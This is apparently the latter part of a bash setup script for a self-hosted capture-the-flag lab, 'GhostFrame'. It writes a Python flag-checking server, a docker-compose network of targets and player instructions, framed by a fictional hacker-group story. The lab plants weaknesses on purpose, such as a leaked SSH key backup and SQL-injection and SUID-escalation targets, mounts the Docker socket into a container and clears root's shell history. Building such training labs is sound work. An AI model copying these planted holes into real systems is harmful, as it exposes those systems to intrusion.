SUBJECT: Operation Ghost Frame - Debrief

Impressive work. You successfully retraced 0xGhost's steps and recovered his final report on Project Griffin. Getting into QEC-Sim wasn't easy; he didn't make it out after reaching that point. TargetCorp internal security snagged him moments after he accessed the payload data. Assume he is compromised or worse - consider him lost.

Your findings confirm our suspicions about Griffin. An autonomous cyberweapon AI... reckless doesn't even begin to cover it. The data you recovered is invaluable. Nu11Division will ensure it doesn't fall into the wrong hands, nor will TargetCorp be allowed to deploy it easily.

You've proven your skills and nerve under pressure. Welcome to Nu11Division.

Clean your tracks. Lay low. Await new assignment via secure channel. Do not discuss this operation.

Zer0Frame out.
"""
    try:
        os.makedirs(os.path.dirname(message_file), exist_ok=True)
        with open(message_file, "w") as f:
            f.write(message + "\n")
        logger.info(f"Final message dropped into ssh-jump volume: {message_file}")
    except Exception as e:
        logger.error(f"Could not write final message file {message_file}: {e}")
    # Optionally stop other containers here?
    # try:
    #     for container in DOCKER_CLIENT.containers.list():
    #         if container.name != 'flag_director' and container.name != 'openvpn_server':
    #              logger.info(f"Stopping container: {container.name}")
    #              container.stop(timeout=5)
    # except Exception as e:
    #     logger.error(f"Error stopping containers: {e}")


# --- TCP Handler ---
class FlagCheckerHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(1024).strip()
            flag = data.decode('utf-8').strip()
            client_ip = self.client_address[0]
            logger.info(f"Received connection from {client_ip}, potential flag: '{flag}'")

            response = "INVALID FLAG\n"
            is_valid = False

            # Validate flag format and check against loaded list
            if flag.startswith("FLAG{") and flag.endswith("}") and flag in ALL_FLAGS:
                 is_valid = True

            if is_valid:
                # Use threading lock for safe access to shared SUBMITTED_FLAGS set
                with flag_lock:
                    if flag in SUBMITTED_FLAGS:
                        response = "FLAG ALREADY SUBMITTED\n"
                        logger.warning(f"Flag '{flag}' already submitted by {client_ip}.")
                    else:
                        response = "VALID FLAG ACCEPTED\n"
                        SUBMITTED_FLAGS.add(flag)
                        logger.info(f"Flag '{flag}' accepted from {client_ip}.")
                        # Check if this flag triggers an action
                        if flag in ACTION_FLAGS:
                            action_function_name = ACTION_FLAGS[flag]
                            action_function = globals().get(action_function_name)
                            if action_function:
                                logger.info(f"Flag '{flag}' triggers action: {action_function_name}")
                                # Run action in a separate thread to avoid blocking server
                                action_thread = threading.Thread(target=action_function, daemon=True)
                                action_thread.start()
                            else:
                                logger.error(f"Action function '{action_function_name}' not found for flag '{flag}'!")
            else:
                 logger.warning(f"Invalid flag received from {client_ip}: '{flag}'")

            self.request.sendall(response.encode('utf-8'))
        except Exception as e:
            logger.error(f"Error handling request from {self.client_address[0]}: {e}")


# --- Main Server ---
if __name__ == "__main__":
    ALL_FLAGS = set()
    flag_lock = threading.Lock() # Lock for accessing SUBMITTED_FLAGS

    # Load all valid flags from the mounted file
    try:
        if os.path.exists(FLAGS_FILE):
             with open(FLAGS_FILE, 'r') as f:
                 ALL_FLAGS = {line.strip() for line in f if line.strip().startswith("FLAG{")}
             logger.info(f"Loaded {len(ALL_FLAGS)} flags from {FLAGS_FILE}")
        else:
             logger.error(f"Flags file not found at {FLAGS_FILE}")
    except Exception as e:
        logger.error(f"Could not load flags file {FLAGS_FILE}: {e}")


    # Start the server
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    server = socketserver.ThreadingTCPServer((HOST, PORT), FlagCheckerHandler)
    logger.info(f"Flag Checker Server starting on {HOST}:{PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down.")
        server.shutdown()
        server.server_close()

EOF

# Write flags file for director
echo "[*]   Writing flags file for Director..."
# Ensure all flags are listed, one per line
cat << EOF > "${PROJECT_DIR}/director/flags.txt"
${FLAG_ZFINSTRUCT}
${FLAG_MAINSTRAT}
${FLAG_HIDDENSPACE}
${FLAG_KEEPASS}
# The specific STEGO flag value is generated by populate script, use wildcard match? Or store it?
# For simplicity, director just checks format for now, or we need to pass the generated value. Let's skip precise check for stego.
# ${FLAG_STEGO}
${FLAG_BASE64}
${FLAG_CANARY}
${FLAG_JUMPBOX}
${FLAG_WEBCREDS}
${FLAG_PORTALSQLI}
${FLAG_PORTALHTML}
${FLAG_DBCONNECT}
${FLAG_FILESERVCREDS}
${FLAG_WIKIACCESS}
${FLAG_SVCKEY}
${FLAG_QECROOT}
${FLAG_PAYLOADFOUND}
${FLAG_FINAL}
EOF
echo "[+] Director script and flags file written."
}

write_compose_file_master() {
echo "[*] Writing docker-compose.yml..."
# Use variables defined at the top for IPs, networks, flags etc.
local COMPOSE_PROJECT_NAME=$(basename "${PROJECT_DIR}") # e.g., ghostframe_ctf

cat << EOF > "${PROJECT_DIR}/docker-compose.yml"
version: '3.8'

networks:
  dmz_net:
    driver: bridge
    ipam: { config: [{ subnet: ${DMZ_SUBNET} }] }
  internal_net1:
    driver: bridge
    ipam: { config: [{ subnet: ${INTERNAL1_SUBNET} }] }
  internal_net2_hsz:
    name: ${COMPOSE_PROJECT_NAME}_internal_net2_hsz # Explicit network name for director
    driver: bridge
    ipam: { config: [{ subnet: ${INTERNAL2_HSZ_SUBNET} }] }
  control_net:
    driver: bridge
    ipam: { config: [{ subnet: ${CONTROL_NET_SUBNET} }] }

services:
  openvpn:
    image: kylemanna/openvpn:latest # Use latest or specific tag
    container_name: openvpn_server # Explicit name for easier reference
    ports: ["1194:1194/udp"]
    networks:
      # Connects to all networks it needs to push routes for
      - dmz_net
      - internal_net1
      - internal_net2_hsz
    cap_add: [NET_ADMIN] # Required for VPN routing/iptables
    security_opt: # Needed on some systems
      - label:disable
    volumes: ["./vpn_data:/etc/openvpn"] # Mount volume for config/keys
    restart: unless-stopped

  director:
    build: ./director
    container_name: flag_director # Explicit name
    networks:
      control_net: { ipv4_address: ${DIRECTOR_IP} } # Static IP for easy access from VPN
      # Also connect director to target networks to allow it to manage connections
      dmz_net:
      internal_net1:
      internal_net2_hsz:
    volumes:
      # Mount docker socket to control other containers/networks
      - /var/run/docker.sock:/var/run/docker.sock
      # Mount flags file (read-only)
      - ./director/flags.txt:/app/flags.txt:ro
      # Mount ssh-jump's message directory to drop messages into
      - ./ssh_jump_data/messages:/app/target_mounts/ssh_jump # Target for writing messages
    environment:
      # Pass variables director might need
      PROJECT_DIR_NAME: ${COMPOSE_PROJECT_NAME}
      SSH_JUMP_DMZ_IP: ${SSH_JUMP_DMZ_IP}
      QECSIM_IP: ${QEC_SIM_HSZ_IP} # Use consistent name
    restart: unless-stopped

  ssh-jump:
    build: ./ssh_jump_data # Assumes Dockerfile in this dir
    container_name: ssh-jump # Explicit name
    hostname: ssh-jump # Internal hostname
    networks:
      dmz_net: { ipv4_address: ${SSH_JUMP_DMZ_IP} }
      internal_net1: # Also connects to internal net 1
      # internal_net2_hsz: # Connected later by director action
    volumes:
      # Mount host directory where director drops messages (read-only for this container)
      - ./ssh_jump_data/messages:/home/ghost/messages:ro
      # Mount flag file (read-only)
      - ./ssh_jump_data/flag.txt:/home/ghost/flag.txt:ro
      # Mount check script
      - ./ssh_jump_data/check_connections.sh:/home/ghost/scripts/check_connections.sh:ro
    # Add depends_on director? Maybe not needed, starts async
    restart: unless-stopped

  web-dmz:
    image: nginx:alpine
    container_name: web-dmz
    hostname: web-dmz.targetcorp.com # Hostname for realism
    networks:
      dmz_net: { ipv4_address: ${WEB_DMZ_IP} } # Assign static IP
    volumes:
      - ./web_dmz_data/html:/usr/share/nginx/html:ro
      - ./web_dmz_data/flag_webdmz.txt:/flag.txt:ro # Internal flag
    restart: unless-stopped

  portal-dmz:
     build: # Build the portal container using its Dockerfile
       context: ./portal_dmz_data
     container_name: portal-dmz
     hostname: portal.targetcorp.com
     networks:
       dmz_net: { ipv4_address: ${PORTAL_DMZ_IP} } # Static IP
       internal_net1: # Needs to reach DB
     volumes:
       # Mount internal flag file
       - ./portal_dmz_data/flag_portal.txt:/var/www/html/flag_portal.txt:ro
     depends_on: # Ensure DB starts first
       - db-internal
     restart: unless-stopped

  db-internal:
    image: mysql:5.7 # Use specific stable version
    container_name: db-internal
    hostname: db.targetcorp.local
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASS}
      # MYSQL_DATABASE: targetcorp_db # DB created by init script
      # MYSQL_USER: # User created by init script
      # MYSQL_PASSWORD: # User created by init script
    networks:
      internal_net1: { ipv4_address: ${DB_INT1_IP} } # Static IP
    volumes:
      # Mount init script (read-only)
      - ./db_internal_data/mysql_init:/docker-entrypoint-initdb.d:ro
      # Mount persistent data volume
      - ./db_internal_data/data:/var/lib/mysql
      # Mount flag file (read-only)
      - ./db_internal_data/flag_db.txt:/flag.txt:ro # Needs flag file created
    restart: unless-stopped

  fileserv:
    image: dperson/samba:latest
    container_name: fileserv
    hostname: fileserv.targetcorp.local
    # Use command line for simple setup. Add -p to enable printing config at start.
    command: '-p -u "ghost;${GHOST_SAMBA_PASS}" -s "Public;/shares/Public;yes;no;yes;all;Public Share" -s "HR_Shared;/shares/HR_Shared;yes;no;yes;ghost;HR Docs" -s "ghost_data;/shares/ghost_data;yes;no;yes;ghost;Ghost Research"'
    networks:
      internal_net1: { ipv4_address: ${FILESREV_INT1_IP} } # Static IP
    volumes:
      # Mount the shares directory from host
      - ./fileserv_data/shares:/shares
    restart: unless-stopped

  dev-wiki:
     build: # Build the wiki container
       context: ./dev_wiki_data
     container_name: dev-wiki
     hostname: dev-wiki.targetcorp.local
     networks:
       internal_net1: { ipv4_address: ${DEVWIKI_INT1_IP} } # Static IP
     volumes:
       # Mount flags dir (read-only)
       - ./dev_wiki_data/flags:/flags:ro
       # Mount key backup (read-only)
       - ./dev_wiki_data/id_rsa_svc_deploy:/var/www/html/key_backup/id_rsa_svc_deploy_backup:ro # Path accessible to web user if needed
     # Add depends_on db-internal if wiki uses it
     restart: unless-stopped

  test-server: # Rabbit hole - minimal alpine
    image: alpine:latest
    container_name: test-server
    hostname: test-server.targetcorp.local
    command: ["sleep", "infinity"] # Keep container running
    networks:
      internal_net1: { ipv4_address: ${TESTSERV_INT1_IP} } # Static IP
    restart: unless-stopped

  qec-sim:
    build: ./qec_sim_data # Build using Dockerfile in this dir
    container_name: qec-sim # Explicit name
    hostname: qec-sim.targetcorp.internal
    networks:
      # Connect ONLY to HSZ network initially
      internal_net2_hsz: { ipv4_address: ${QEC_SIM_HSZ_IP} }
    volumes:
      - ./qec_sim_data/payload:/opt/qec/payload:ro
      - ./qec_sim_data/root:/root:ro
      - ./qec_sim_data/flags:/flags_internal:ro
      - ./qec_sim_data/config:/opt/qec/config:ro # Optional config dir
    # Add cap_add or security_opt if SUID exploit needs them (e.g., ptrace)
    # security_opt: ["seccomp=unconfined"] # Use with caution
    restart: unless-stopped

EOF

# Create flag files referenced by compose volumes if not created elsewhere
[[ ! -f "${PROJECT_DIR}/db_internal_data/flag_db.txt" ]] && echo "${FLAG_DBCONNECT}" > "${PROJECT_DIR}/db_internal_data/flag_db.txt"
# Flag files for dev-wiki and qec-sim are created during populate_docker_volumes_master

echo "[+] docker-compose.yml written."
}


# --- Main Execution Flow ---

# Get the directory where the master script is located
MASTER_SCRIPT_DIR=$(dirname "$(readlink -f "$0")")

echo "--- GhostFrame CTF Host Setup & Deployment ---"
echo "[!!!] WARNING: This script will modify the host Kali system!"
echo "[!!!] It will create user '${GHOST_USER}', install packages, place files in \`${GHOST_USER_HOME}\`, and setup Docker."
echo "[!!!] RUN ONLY ON A DEDICATED, DISPOSABLE KALI SYSTEM (VM recommended)."
read -p "[?] Are you SURE you want to continue? (y/N): " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "[ABORTED] Setup cancelled by user."
    exit 1
fi

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "[FATAL] This script MUST be run with sudo or as root."
   exit 1
fi
echo "[ASSUMPTION] Running as root/sudo."

# Check Core Dependencies early
echo "[1/9] Checking Core Dependencies..."
check_dep docker.io
check_dep docker-compose # Check for docker-compose explicitly
check_dep openvpn # Check for openvpn client needed on host
check_dep openssl
check_dep zip
check_dep steghide
check_dep imagemagick # For convert command
check_dep coreutils # For fallocate, base64, etc.
check_dep git # Used in populate script history/cloning simulation
check_dep build-essential # Needed for compiling SUID binary in container build
echo "[+] Core dependencies check complete (installation attempted if missing)."

# Create Temp File for Populate Script
TEMP_POPULATE="/tmp/populate_ghost_host.$$.sh"
# Inject environment variables needed by the populate script text generation
export GHOST_USER SSH_KEY_PASS ZIP_PASS KEEPASS_PASS STEGO_PASS DELTA_CHARLIE_KEY MYSQL_ROOT_PASS DB_WEB_USER DB_WEB_PASS GHOST_SAMBA_PASS SVC_DEPLOY_SSH_KEY_PASSPHRASE
export VPN_SERVER_FQDN VPN_SUBNET DMZ_SUBNET INTERNAL1_SUBNET INTERNAL2_HSZ_SUBNET CONTROL_NET_SUBNET DIRECTOR_IP DIRECTOR_PORT SSH_JUMP_DMZ_IP WEB_DMZ_IP PORTAL_DMZ_IP DB_INT1_IP FILESREV_INT1_IP DEVWIKI_INT1_IP TESTSERV_INT1_IP QEC_SIM_HSZ_IP
export TARGET_DOMAIN_EXTERNAL ADMIN_EMAIL CANARY_EMAIL
export FLAG_ZFINSTRUCT FLAG_MAINSTRAT FLAG_HIDDENSPACE FLAG_KEEPASS FLAG_BASE64 FLAG_CANARY FLAG_JUMPBOX FLAG_WEBCREDS FLAG_PORTALSQLI FLAG_PORTALHTML FLAG_DBCONNECT FLAG_FILESERVCREDS FLAG_WIKIACCESS FLAG_SVCKEY FLAG_QECROOT FLAG_PAYLOADFOUND FLAG_FINAL
echo "$POPULATE_SCRIPT_CONTENT" > "$TEMP_POPULATE"
chmod +x "$TEMP_POPULATE"
echo "[+] Populate script saved to $TEMP_POPULATE"

# Execute Host Ghostification
echo "[2/9] Running Host 'Ghostification' Script..."
# Pass environment variables explicitly just in case inheritence isn't perfect
if sudo -E bash "$TEMP_POPULATE"; then
    echo "[+] Host population script completed successfully."
else
    echo "[FATAL] Host population script failed. Check errors above. Aborting."
    rm -f "$TEMP_POPULATE"
    exit 1
fi
rm -f "$TEMP_POPULATE" # Clean up temp script

# Setup Docker Project Structure
echo "[3/9] Setting up Docker project directories..."
setup_docker_dirs

# Generate Docker Keys & Copy Ghost Key
echo "[4/9] Generating/Staging Docker SSH keys..."
generate_docker_keys_and_copy_ghost

# Generate VPN Configs using Docker
echo "[5/9] Generating VPN configurations..."
generate_vpn_config_docker || { echo "[FATAL] VPN generation failed. Is Docker service running properly?"; exit 1; }

# Populate Docker Volumes
echo "[6/9] Populating Docker volumes..."
populate_docker_volumes_master

# Write Dockerfiles
echo "[7/9] Writing Dockerfiles..."
write_dockerfiles_master # Ensure functions write files needed by compose build steps
write_director_script_master # Write director python script + flags file

# Write Docker Compose File
echo "[8/9] Writing docker-compose.yml..."
write_compose_file_master

# Start Docker Environment
echo "[9/9] Starting Docker environment..."
# Ensure we are in the correct directory
cd "${PROJECT_DIR}" || { echo "[FATAL] Failed to cd into project directory: ${PROJECT_DIR}"; exit 1; }

echo "[*] Running docker-compose build (this might take a while)..."
if docker-compose build; then
  echo "[+] Docker images built successfully."
else
  echo "[FATAL] Docker build failed. Check Dockerfiles and script output. Check build-essential package. Aborting."
  # Attempt cleanup
  docker-compose down -v --remove-orphans > /dev/null 2>&1 || true
  exit 1
fi

echo "[*] Running docker-compose up -d..."
if docker-compose up -d; then
    echo "[+] Docker environment started successfully."
else
    echo "[FATAL] docker-compose up failed. Check Docker daemon status, compose file, and port conflicts. Aborting."
    # Attempt cleanup
    docker-compose down -v --remove-orphans > /dev/null 2>&1 || true
    exit 1
fi
# Return to original directory if needed, though script ends here.
# cd - > /dev/null

# Final Cleanup & Instructions
echo "[*] Attempting final history cleanup..."
# This only clears the history for the root user session that ran the script
history -c
history -w

echo ""
echo "--- SETUP COMPLETE ---"
echo ""
echo "[IMPORTANT]"
echo "* This Kali machine has been MODIFIED to simulate 0xGhost's environment."
echo "* The user '${GHOST_USER}' has been created/configured. Password: '${GHOST_SAMBA_PASS}'"
echo "* You should LOG OUT and LOG BACK IN as user '${GHOST_USER}' to use the configured environment."
echo ""
echo "[NEXT STEPS (LOGIN AS '${GHOST_USER}' ON THIS MACHINE)]"
echo "1. Find the VPN config: \`~/player-ghostframe.ovpn\`"
echo "2. Connect to VPN (requires sudo): \`sudo openvpn --config ~/player-ghostframe.ovpn\`"
echo "   (Enter '${GHOST_SAMBA_PASS}' for sudo prompt)"
echo "3. Explore YOUR home directory (\`~\`) - it contains 0xGhost's files/clues."
echo "4. Use clues (keys, passwords, target IPs from files) to interact with the Docker network via VPN."
echo "5. Submit flags to director: \`nc ${DIRECTOR_IP} ${DIRECTOR_PORT}\` (or \`nc director ${DIRECTOR_PORT}\`)"
echo ""
echo "[DOCKER MANAGEMENT (Run from \`${PROJECT_DIR}\`)]"
echo "- Stop: \`sudo docker-compose down\`"
echo "- Stop & Remove Data: \`sudo docker-compose down -v\`"
echo "- View Logs: \`sudo docker-compose logs -f [service_name]\` (e.g., flag_director)"
echo "- Restart: \`sudo docker-compose restart [service_name]\`"
echo ""
exit 0
